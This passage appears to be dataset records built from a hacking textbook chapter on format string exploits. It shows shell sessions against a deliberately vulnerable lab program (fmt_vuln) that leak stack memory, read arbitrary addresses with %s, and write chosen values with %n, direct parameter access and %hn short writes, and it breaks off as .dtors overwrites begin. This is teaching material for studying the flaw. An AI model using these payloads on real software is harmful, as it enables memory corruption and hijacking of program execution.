input:\n%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\n%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\n%08x.%08x.\nThe wrong way to print user-controlled input:\nbffff320.b7fe75fc.00000000.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252\ne78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.2\n52e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e78\n38.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $\nThis is what the lower stack memory looks like. Remember that each\nfour-byte word is backward, due to the little-endian architecture. The bytes\n0x25, 0x30, 0x38, 0x78, and 0x2e seem to be repeating a lot. Wonder what those\nbytes are?\nreader@hacking:~/booksrc $ printf \"\\x25\\x30\\x38\\x78\\x2e\\n\"\n%08x.\nreader@hacking:~/booksrc $\nAs you can see, they’re the memory for the format string itself. Because\nthe format function will always be on the highest stack frame, as long as the\nformat string has been stored anywhere on the stack, it will be located below\nthe current frame pointer (at a higher memory address). This fact can be\nused to control arguments to the format function. It is particularly useful if\nformat parameters that pass by reference are used, such as %s or %n.\nExploitation 171"
  },
  {
    "input": "0x353 Reading from Arbitrary Memory Addresses",
    "output": "0x353 Reading from Arbitrary Memory Addresses\nThe %s format parameter can be used to read from arbitrary memory addresses.\nSince it’s possible to read the data of the original format string, part of the\noriginal format string can be used to supply an address to the %s format\nparameter, as shown here:\nreader@hacking:~/booksrc $ ./fmt_vuln AAAA%08x.%08x.%08x.%08x\nThe right way to print user-controlled input:\nAAAA%08x.%08x.%08x.%08x\nThe wrong way to print user-controlled input:\nAAAAbffff3d0.b7fe75fc.00000000.41414141\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $\nThe four bytes of 0x41 indicate that the fourth format parameter is\nreading from the beginning of the format string to get its data. If the fourth\nformat parameter is %s instead of %x, the format function will attempt to print\nthe string located at 0x41414141. This will cause the program to crash in a seg-\nmentation fault, since this isn’t a valid address. But if a valid memory address\nis used, this process could be used to read a string found at that memory\naddress.\nreader@hacking:~/booksrc $ env | grep PATH\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\nreader@hacking:~/booksrc $ ./getenvaddr PATH ./fmt_vuln\nPATH will be at 0xbffffdd7\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\xd7\\xfd\\xff\\xbf\")%08x.%08x.%08x.%s\nThe right way to print user-controlled input:\n????%08x.%08x.%08x.%s\nThe wrong way to print user-controlled input:\n????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/\nusr/games\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $\nHere the getenvaddr program is used to get the address for the environ-\nment variable PATH. Since the program name fmt_vuln is two bytes less than\ngetenvaddr, four is added to the address, and the bytes are reversed due to the\nbyte ordering. The fourth format parameter of %s reads from the beginning\nof the format string, thinking it’s the address that was passed as a function\nargument. Since this address is the address of the PATH environment variable,\nit is printed as if a pointer to the environment variable were passed to printf().\nNow that the distance between the end of the stack frame and the begin-\nning of the format string memory is known, the field-width arguments can be\nomitted in the %x format parameters. These format parameters are only needed\nto step through memory. Using this technique, any memory address can be\nexamined as a string.\n172 0x300"
  },
  {
    "input": "0x354 Writing to Arbitrary Memory Addresses",
    "output": "0x354 Writing to Arbitrary Memory Addresses\nIf the %s format parameter can be used to read an arbitrary memory address,\nyou should be able to use the same technique with %n to write to an arbitrary\nmemory address. Now things are getting interesting.\nThe test_val variable has been printing its address and value in the\ndebug statement of the vulnerable fmt_vuln.c program, just begging to be\noverwritten. The test variable is located at 0x08049794, so by using a similar\ntechnique, you should be able to write to the variable.\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\xd7\\xfd\\xff\\xbf\")%08x.%08x.%08x.%s\nThe right way to print user-controlled input:\n????%08x.%08x.%08x.%s\nThe wrong way to print user-controlled input:\n????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/\nusr/games\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%08x.%08x.%08x.%n\nThe right way to print user-controlled input:\n??%08x.%08x.%08x.%n\nThe wrong way to print user-controlled input:\n??bffff3d0.b7fe75fc.00000000.\n[*] test_val @ 0x08049794 = 31 0x0000001f\nreader@hacking:~/booksrc $\nAs this shows, the test_val variable can indeed be overwritten using the\n%n format parameter. The resulting value in the test variable depends on the\nnumber of bytes written before the %n. This can be controlled to a greater\ndegree by manipulating the field width option.\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%x%n\nThe right way to print user-controlled input:\n??%x%x%x%n\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc0\n[*] test_val @ 0x08049794 = 21 0x00000015\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%100x%n\nThe right way to print user-controlled input:\n??%x%x%100x%n\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc\n0\n[*] test_val @ 0x08049794 = 120 0x00000078\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%180x%n\nThe right way to print user-controlled input:\n??%x%x%180x%n\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc\n0\n[*] test_val @ 0x08049794 = 200 0x000000c8\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%400x%n\nThe right way to print user-controlled input:\n??%x%x%400x%n\nExploitation 173\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc\n0\n[*] test_val @ 0x08049794 = 420 0x000001a4\nreader@hacking:~/booksrc $\nBy manipulating the field-width option of one of the format parameters\nbefore the %n, a certain number of blank spaces can be inserted, resulting in\nthe output having some blank lines. These lines, in turn, can be used to\ncontrol the number of bytes written before the %n format parameter. This\napproach will work for small numbers, but it won’t work for larger ones, like\nmemory addresses.\nLooking at the hexadecimal representation of the test_val value, it’s\napparent that the least significant byte can be controlled fairly well. (Remember\nthat the least significant byte is actually located in the first byte of the four-\nbyte word of memory.) This detail can be used to write an entire address.\nIffour writes are done at sequential memory addresses, the least significant\nbyte can be written to each byte of a four-byte word, as shown here:\nMemory 94 95 96 97\nFirst write to 0x08049794 AA 00 00 00\nSecond write to 0x08049795 BB 00 00 00\nThird write to 0x08049796 CC 00 00 00\nFourth write to 0x08049797 DD 00 00 00\nResult AA BB CC DD\nAs an example, let’s try to write the address 0xDDCCBBAA into the test\nvariable. In memory, the first byte of the test variable should be 0xAA, then 0xBB,\nthen 0xCC, and finally 0xDD. Four separate writes to the memory addresses\n0x08049794, 0x08049795, 0x08049796, and 0x08049797 should accomplish this.\nThe first write will write the value 0x000000aa, the second 0x000000bb, the third\n0x000000cc, and finally 0x000000dd.\nThe first write should be easy.\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%8x%n\nThe right way to print user-controlled input:\n??%x%x%8x%n\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc 0\n[*] test_val @ 0x08049794 = 28 0x0000001c\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0xaa - 28 + 8\n$1 = 150\n(gdb) quit\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%150x%n\nThe right way to print user-controlled input:\n??%x%x%150x%n\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc\n0\n[*] test_val @ 0x08049794 = 170 0x000000aa\nreader@hacking:~/booksrc $\n174 0x300\nThe last %x format parameter uses 8 as the field width to standardize the\noutput. This is essentially reading a random DWORD from the stack, which\ncould output anywhere from 1 to 8 characters. Since the first overwrite puts\n28 into test_val, using 150 as the field width instead of 8 should control the\nleast significant byte of test_val to 0xAA.\nNow for the next write. Another argument is needed for another %x\nformat parameter to increment the byte count to 187, which is 0xBB in\ndecimal. This argument could be anything; it just has to be four bytes long\nand must be located after the first arbitrary memory address of 0x08049754.\nSince this is all still in the memory of the format string, it can be easily\ncontrolled. The word JUNK is four bytes long and will work fine.\nAfter that, the next memory address to be written to, 0x08049755, should\nbe put into memory so the second %n format parameter can access it. This\nmeans the beginning of the format string should consist of the target mem-\nory address, four bytes of junk, and then the target memory address plus one.\nBut all of these bytes of memory are also printed by the format function,\nthus incrementing the byte counter used for the %n format parameter. This is\ngetting tricky.\nPerhaps we should think about the beginning of the format string ahead\nof time. The goal is to have four writes. Each one will need to have a memory\naddress passed to it, and among them all, four bytes of junk are needed to\nproperly increment the byte counter for the %n format parameters. The first\n%x format parameter can use the four bytes found before the format string\nitself, but the remaining three will need to be supplied data. For the entire\nwrite procedure, the beginning of the format string should look like this:\n0x08049794 0x08049795 0x08049796 0x08049797\n94 97 04 08 J U N K 95 97 04 08 J U N K 96 97 04 08 J U N K 97 97 04 08\nLet’s give it a try.\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08JUNK\\x95\\x97\\x04\\x08JUNK\\x96\\\nx97\\x04\\x08JUNK\\x97\\x97\\x04\\x08\")%x%x%8x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%8x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3c0b7fe75fc 0\n[*] test_val @ 0x08049794 = 52 0x00000034\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xaa - 52 + 8\"\n$1 = 126\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08JUNK\\x95\\x97\\x04\\x08JUNK\\x96\\\nx97\\x04\\x08JUNK\\x97\\x97\\x04\\x08\")%x%x%126x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%126x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3c0b7fe75fc\n0\n[*] test_val @ 0x08049794 = 170 0x000000aa\nreader@hacking:~/booksrc $\nExploitation 175\nThe addresses and junk data at the beginning of the format string changed\nthe value of the necessary field width option for the %x format parameter.\nHowever, this is easily recalculated using the same method as before. Another\nway this could have been done is to subtract 24 from the previous field width\nvalue of 150, since 6 new 4-byte words have been added to the front of the\nformat string.\nNow that all the memory is set up ahead of time in the beginning of the\nformat string, the second write should be simple.\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbb - 0xaa\"\n$1 = 17\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08JUNK\\x95\\x97\\x04\\x08JUNK\\x96\\\nx97\\x04\\x08JUNK\\x97\\x97\\x04\\x08\")%x%x%126x%n%17x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%126x%n%17x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3b0b7fe75fc\n0 4b4e554a\n[*] test_val @ 0x08049794 = 48042 0x0000bbaa\nreader@hacking:~/booksrc $\nThe next desired value for the least significant byte is 0xBB. A hexa-\ndecimal calculator quickly shows that 17 more bytes need to be written\nbefore the next %n format parameter. Since memory has already been set\nup for a %x format parameter, it’s simple to write 17 bytes using the field\nwidth option.\nThis process can be repeated for the third and fourth writes.\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xcc - 0xbb\"\n$1 = 17\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xdd - 0xcc\"\n$1 = 17\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08JUNK\\x95\\x97\\x04\\x08JUNK\\x96\\\nx97\\x04\\x08JUNK\\x97\\x97\\x04\\x08\")%x%x%126x%n%17x%n%17x%n%17x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%126x%n%17x%n%17x%n%17x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3b0b7fe75fc\n0 4b4e554a 4b4e554a 4b4e554a\n[*] test_val @ 0x08049794 = -573785174 0xddccbbaa\nreader@hacking:~/booksrc $\nBy controlling the least significant byte and performing four writes, an\nentire address can be written to any memory address. It should be noted that\nthe three bytes found after the target address will also be overwritten using\nthis technique. This can be quickly explored by statically declaring another\ninitialized variable called next_val, right after test_val, and also displaying\nthis value in the debug output. The changes can be made in an editor or with\nsome more sed magic.\n176 0x300\nHere, next_val is initialized with the value 0x11111111, so the effect of the\nwrite operations on it will be apparent.\nreader@hacking:~/booksrc $ sed -e 's/72;/72, next_val = 0x11111111;/;/@/{h;s/test/next/g;x;G}'\nfmt_vuln.c > fmt_vuln2.c\nreader@hacking:~/booksrc $ diff fmt_vuln.c fmt_vuln2.c\n7c7\n< static int test_val = -72;\n---\n> static int test_val = -72, next_val = 0x11111111;\n27a28\n> printf(\"[*] next_val @ 0x%08x = %d 0x%08x\\n\", &next_val, next_val, next_val);\nreader@hacking:~/booksrc $ gcc -o fmt_vuln2 fmt_vuln2.c\nreader@hacking:~/booksrc $ ./fmt_vuln2 test\nThe right way:\ntest\nThe wrong way:\ntest\n[*] test_val @ 0x080497b4 = -72 0xffffffb8\n[*] next_val @ 0x080497b8 = 286331153 0x11111111\nreader@hacking:~/booksrc $\nAs the preceding output shows, the code change has also moved the\naddress of the test_val variable. However, next_val is shown to be adjacent to it.\nFor practice, let’s write an address into the variable test_val again, using the\nnew address.\nLast time, a very convenient address of 0xddccbbaa was used. Since each\nbyte is greater than the previous byte, it’s easy to increment the byte counter\nfor each byte. But what if an address like 0x0806abcd is used? With this address,\nthe first byte of 0xCD is easy to write using the %n format parameter by output-\nting 205 bytes total bytes with a field width of 161. But then the next byte to\nbe written is 0xAB, which would need to have 171 bytes outputted. It’s easy to\nincrement the byte counter for the %n format parameter, but it’s impossible\nto subtract from it.\nreader@hacking:~/booksrc $ ./fmt_vuln2 AAAA%x%x%x%x\nThe right way to print user-controlled input:\nAAAA%x%x%x%x\nThe wrong way to print user-controlled input:\nAAAAbffff3d0b7fe75fc041414141\n[*] test_val @ 0x080497f4 = -72 0xffffffb8\n[*] next_val @ 0x080497f8 = 286331153 0x11111111\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xcd - 5\"\n$1 = 200\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%8x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%8x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3c0b7fe75fc 0\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nExploitation 177\nreader@hacking:~/booksrc $\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%8x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%8x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3c0b7fe75fc 0\n[*] test_val @ 0x080497f4 = 52 0x00000034\n[*] next_val @ 0x080497f8 = 286331153 0x11111111\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xcd - 52 + 8\"\n$1 = 161\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%161x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3b0b7fe75fc\n0\n[*] test_val @ 0x080497f4 = 205 0x000000cd\n[*] next_val @ 0x080497f8 = 286331153 0x11111111\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xab - 0xcd\"\n$1 = -34\nreader@hacking:~/booksrc $\nInstead of trying to subtract 34 from 205, the least significant byte is just\nwrapped around to 0x1AB by adding 222 to 205 to produce 427, which is the\ndecimal representation of 0x1AB. This technique can be used to wrap around\nagain and set the least significant byte to 0x06 for the third write.\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x1ab - 0xcd\"\n$1 = 222\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p /d 0x1ab\"\n$1 = 427\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n%222x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3b0b7fe75fc\n0\n4b4e554a\n[*] test_val @ 0x080497f4 = 109517 0x0001abcd\n[*] next_val @ 0x080497f8 = 286331136 0x11111100\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x06 - 0xab\"\n$1 = -165\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x106 - 0xab\"\n$1 = 91\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n%222x%n%91x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3b0b7fe75fc\n0\n4b4e554a\n178 0x300\n4b4e554a\n[*] test_val @ 0x080497f4 = 33991629 0x0206abcd\n[*] next_val @ 0x080497f8 = 286326784 0x11110000\nreader@hacking:~/booksrc $\nWith each write, bytes of the next_val variable, adjacent to test_val, are\nbeing overwritten. The wraparound technique seems to be working fine, but\na slight problem manifests itself as the final byte is attempted.\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x08 - 0x06\"\n$1 = 2\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n%222x%n%91x%n%2x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%2x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3a0b7fe75fc\n0\n4b4e554a\n4b4e554a4b4e554a\n[*] test_val @ 0x080497f4 = 235318221 0x0e06abcd\n[*] next_val @ 0x080497f8 = 285212674 0x11000002\nreader@hacking:~/booksrc $\nWhat happened here? The difference between 0x06 and 0x08 is only two,\nbut eight bytes are output, resulting in the byte 0x0e being written bythe %n\nformat parameter, instead. This is because the field width option for the\n%xformat parameter is only a minimum field width, and eight bytes of data\nwere output. This problem can be alleviated by simply wrapping around\nagain; however, it’s good to know the limitations of the field widthoption.\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x108 - 0x06\"\n$1 = 258\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\xf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n%222x%n%91x%n%258x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%258x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3a0b7fe75fc\n0\n4b4e554a\n4b4e554a\n4b4e554a\n[*] test_val @ 0x080497f4 = 134654925 0x0806abcd\n[*] next_val @ 0x080497f8 = 285212675 0x11000003\nreader@hacking:~/booksrc $\nJust like before, the appropriate addresses and junk data are put in the\nbeginning of the format string, and the least significant byte is controlled for\nfour write operations to overwrite all four bytes of the variable test_val. Any\nvalue subtractions to the least significant byte can be accomplished by wrap-\nping the byte around. Also, any additions less than eight may need to be\nwrapped around in a similar fashion.\nExploitation 179"
  },
  {
    "input": "0x355 Direct Parameter Access",
    "output": "0x355 Direct Parameter Access\nDirect parameter access is a way to simplify format string exploits. In the\nprevious exploits, each of the format parameter arguments had to be\nstepped through sequentially. This necessitated using several %x format\nparameters to step through parameter arguments until the beginning of the\nformat string was reached. In addition, the sequential nature required three\n4-byte words of junk to properly write a full address to an arbitrary memory\nlocation.\nAs the name would imply, direct parameter access allows parameters to be\naccessed directly by using the dollar sign qualifier. For example, %n$d would\naccess the nth parameter and display it as a decimal number.\nprintf(\"7th: %7$d, 4th: %4$05d\\n\", 10, 20, 30, 40, 50, 60, 70, 80);\nThe preceding printf() call would have the following output:\n7th: 70, 4th: 00040\nFirst, the 70 is outputted as a decimal number when the format param-\neter of %7$d is encountered, because the seventh parameter is 70. The second\nformat parameter accesses the fourth parameter and uses a field width option\nof 05. All of the other parameter arguments are untouched. This method of\ndirect access eliminates the need to step through memory until the beginning\nof the format string is located, since this memory can be accessed directly.\nThe following output shows the use of direct parameter access.\nreader@hacking:~/booksrc $ ./fmt_vuln AAAA%x%x%x%x\nThe right way to print user-controlled input:\nAAAA%x%x%x%x\nThe wrong way to print user-controlled input:\nAAAAbffff3d0b7fe75fc041414141\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $ ./fmt_vuln AAAA%4\\$x\nThe right way to print user-controlled input:\nAAAA%4$x\nThe wrong way to print user-controlled input:\nAAAA41414141\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $\nIn this example, the beginning of the format string is located at the\nfourth parameter argument. Instead of stepping through the first three\nparameter arguments using %x format parameters, this memory can be\naccessed directly. Since this is being done on the command line and the\ndollar sign is a special character, it must be escaped with a backslash. This\njust tells the command shell to avoid trying to interpret the dollar sign as a\nspecial character. The actual format string can be seen when it is printed\ncorrectly.\n180 0x300\nDirect parameter access also simplifies the writing of memory addresses.\nSince memory can be accessed directly, there’s no need for four-byte spacers\nof junk data to increment the byte output count. Each of the %x format param-\neters that usually performs this function can just directly access a piece of\nmemory found before the format string. For practice, let’s use direct param-\neter access to write a more realistic-looking address of 0xbffffd72 into the\nvariable test_vals.\nreader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print \"\\x94\\x97\\x04\\x08\" . \"\\x95\\x97\\x04\\x08\"\n. \"\\x96\\x97\\x04\\x08\" . \"\\x97\\x97\\x04\\x08\"')%4\\$n\nThe right way to print user-controlled input:\n????????%4$n\nThe wrong way to print user-controlled input:\n????????\n[*] test_val @ 0x08049794 = 16 0x00000010\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0x72 - 16\n$1 = 98\n(gdb) p 0xfd - 0x72\n$2 = 139\n(gdb) p 0xff - 0xfd\n$3 = 2\n(gdb) p 0x1ff - 0xfd\n$4 = 258\n(gdb) p 0xbf - 0xff\n$5 = -64\n(gdb) p 0x1bf - 0xff\n$6 = 192\n(gdb) quit\nreader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print \"\\x94\\x97\\x04\\x08\" . \"\\x95\\x97\\x04\\x08\"\n. \"\\x96\\x97\\x04\\x08\" . \"\\x97\\x97\\x04\\x08\"')%98x%4\\$n%139x%5\\$n\nThe right way to print user-controlled input:\n????????%98x%4$n%139x%5$n\nThe wrong way to print user-controlled input:\n????????\nbffff3c0\nb7fe75fc\n[*] test_val @ 0x08049794 = 64882 0x0000fd72\nreader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print \"\\x94\\x97\\x04\\x08\" . \"\\x95\\x97\\x04\\x08\"\n. \"\\x96\\x97\\x04\\x08\" . \"\\x97\\x97\\x04\\x08\"')%98x%4\\$n%139x%5\\$n%258x%6\\$n%192x%7\\$n\nThe right way to print user-controlled input:\n????????%98x%4$n%139x%5$n%258x%6$n%192x%7$n\nThe wrong way to print user-controlled input:\n????????\nbffff3b0\nb7fe75fc\n0\n8049794\n[*] test_val @ 0x08049794 = -1073742478 0xbffffd72\nreader@hacking:~/booksrc $\nExploitation 181"
  },
  {
    "input": "0x356 Using Short Writes",
    "output": "Since the stack doesn’t need to be printed to reach our addresses, the\nnumber of bytes written at the first format parameter is 16. Direct parameter\naccess is only used for the %n parameters, since it really doesn’t matter what\nvalues are used for the %x spacers. This method simplifies the process of\nwriting an address and shrinks the mandatory size of the format string.\n0x356 Using Short Writes\nAnother technique that can simplify format string exploits is using short\nwrites. A short is typically a two-byte word, and format parameters have a\nspecial way of dealing with them. A more complete description of possible\nformat parameters can be found in the printf manual page. The portion\ndescribing the length modifier is shown in the output below.\nThe length modifier\nHere, integer conversion stands for d, i, o, u, x, or X conversion.\nh A following integer conversion corresponds to a short int or\nunsigned short int argument, or a following n conversion\ncorresponds to a pointer to a short int argument.\nThis can be used with format string exploits to write two-byte shorts. In\nthe output below, a short (shown in bold) is written in at both ends of the\nfour-byte test_val variable. Naturally, direct parameter access can still be used.\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%x%hn\nThe right way to print user-controlled input:\n??%x%x%x%hn\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc0\n[*] test_val @ 0x08049794 = -65515 0xffff0015\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x96\\x97\\x04\\x08\")%x%x%x%hn\nThe right way to print user-controlled input:\n??%x%x%x%hn\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc0\n[*] test_val @ 0x08049794 = 1441720 0x0015ffb8\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x96\\x97\\x04\\x08\")%4\\$hn\nThe right way to print user-controlled input:\n??%4$hn\nThe wrong way to print user-controlled input:\n??\n[*] test_val @ 0x08049794 = 327608 0x0004ffb8\nreader@hacking:~/booksrc $\nUsing short writes, an entire four-byte value can be overwritten with just\ntwo %hn parameters. In the example below, the test_val variable will be over-\nwritten once again with the address 0xbffffd72.\n182 0x300\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0xfd72 - 8\n$1 = 64874\n(gdb) p 0xbfff - 0xfd72\n$2 = -15731\n(gdb) p 0x1bfff - 0xfd72\n$3 = 49805\n(gdb) quit\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\\x96\\x97\\x04\\x08\")%64874x%4\\\n$hn%49805x%5\\$hn\nThe right way to print user-controlled input:\n????%64874x%4$hn%49805x%5$hn\nThe wrong way to print user-controlled input:\nb7fe75fc\n[*] test_val @ 0x08049794 = -1073742478 0xbffffd72\nreader@hacking:~/booksrc $\nThe preceding example used a similar wraparound method to deal with\nthe second write of 0xbfff being less than the first write of 0xfd72. Using short\nwrites, the order of the writes doesn’t matter, so the first write can be 0xfd72\nand the second 0xbfff, if the two passed addresses are swapped in position.\nIn the output below, the address 0x08049796 is written to first, and 0x08049794 is\nwritten to second.\n(gdb) p 0xbfff - 8\n$1 = 49143\n(gdb) p 0xfd72 - 0xbfff\n$2 = 15731\n(gdb) quit\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x96\\x97\\x04\\x08\\x94\\x97\\x04\\x08\")%49143x%4\\\n$hn%15731x%5\\$hn\nThe right way to print user-controlled input:\n????%49143x%4$hn%15731x%5$hn\nThe wrong way to print user-controlled input:\n????\nb7fe75fc\n[*] test_val @ 0x08049794 = -1073742478 0xbffffd72\nreader@hacking:~/booksrc $\nThe ability to overwrite arbitrary memory addresses implies the ability\ntocontrol the execution flow of the program. One option is to overwrite\nthe return address in the most recent stack frame, as was done with the\nstack-based overflows. While this is a possible option, there are other targets\nthat have more predictable memory addresses. The nature of stack-based\noverflows only allows the overwrite of the return address, but format strings\nprovide the ability to overwrite any memory address, which creates other\npossibilities.\nExploitation 183"
  },
  {
    "input": "0x357 Detours with .dtors",
    "output": "0x357 Detours with .dtors\nIn binary programs compiled with the GNU C compiler, special table sections\ncalled .dtors and .ctors are made for destructors and constructors, respectively.\nConstructor functions are executed before the main() function is executed,\nand destructor functions are executed just before the main() function exits\nwith an exit system call. The destructor functions and the .dtors table section\nare of particular interest.\nA function can be declared as a destructor function by defining the\ndestructor attribute, as seen in dtors_sample.c.\ndtors_sample.c\n#include <stdio.h>\n#include <stdlib.h>\nstatic void cleanup(void) __attribute__ ((destructor));\nmain() {\nprintf(\"Some actions happen in the main() function..\\n\");\nprintf(\"and then when main() exits, the destructor is called..\\n\");\nexit(0);\n}\nvoid cleanup(void) {\nprintf(\"In the cleanup function now..\\n\");\n}\nIn the preceding code sample, the cleanup() function is defined with the\ndestructor attribute, so the function is automatically called when the main()\nfunction exits, as shown next.\nreader@hacking:~/booksrc $ gcc -o dtors_sample dtors_sample.c\nreader@hacking:~/booksrc $ ./dtors_sample\nSome actions happen in the main() function..\nand then when main() exits, the destructor is called..\nIn the cleanup() function now..\nreader@hacking:~/booksrc $\nThis behavior of 